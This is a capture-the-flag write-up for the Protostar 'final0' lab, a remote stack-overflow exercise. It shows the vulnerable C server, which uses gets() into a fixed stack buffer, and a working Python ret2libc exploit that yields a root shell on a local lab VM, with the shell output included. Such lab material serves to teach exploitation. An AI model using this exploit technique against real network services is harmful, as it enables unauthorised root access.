# FINAL ZERO

## About

This level combines a stack overflow and network programming for a remote overflow.

Hints: depending on where you are returning to, you may wish to use a toupper() proof shellcode.

Core files will be in /tmp.

This level is at /opt/protostar/bin/final0

## Source code

```C
#include "../common/common.c"

#define NAME "final0"
#define UID 0
#define GID 0
#define PORT 2995

/*
 * Read the username in from the network
 */

char *get_username()
{
  char buffer[512];
  char *q;
  int i;

  memset(buffer, 0, sizeof(buffer));
  gets(buffer);

  /* Strip off trailing new line characters */
  q = strchr(buffer, '\n');
  if(q) *q = 0;
  q = strchr(buffer, '\r');
  if(q) *q = 0;

  /* Convert to lower case */
  for(i = 0; i < strlen(buffer); i++) {
      buffer[i] = toupper(buffer[i]);
  }

  /* Duplicate the string and return it */
  return strdup(buffer);
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  username = get_username();
  
  printf("No such user %s\n", username);
}
```

## Solutions

`FINAL ZERO` là khai thác `stack overflow` và `remote`.

File final0.py

```
import struct
import socket
import telnetlib

HOST = '127.0.0.1'
PORT = 2995
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

padding = "a"*510+"\x00"+"aaaabbbbccccddddeeeef"
execve = struct.pack("I", 0x08048c0c)
binsh = struct.pack("I", 1176511 + 0xb7e97000)
exploit = padding + execve + "AAAA" + binsh + "\x00"*8

s.send(exploit+"\n")
s.send("id\n")
print s.recv(1024)

t = telnetlib.Telnet()
t.sock = s
t.interact()
```

Khai thác.

```
root@protostar:/# /opt/protostar/bin/final0
root@protostar:/tmp# python final0.py
uid=0(root) gid=0(root) groups=0(root)

uname -a
Linux protostar 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686 GNU/Linux


```

## Documents

[Final0](https://www.youtube.com/watch?v=HAN8Qun26cQ)

[Reference](https://github.com/z3tta/Exploit-Exercises-Protostar)



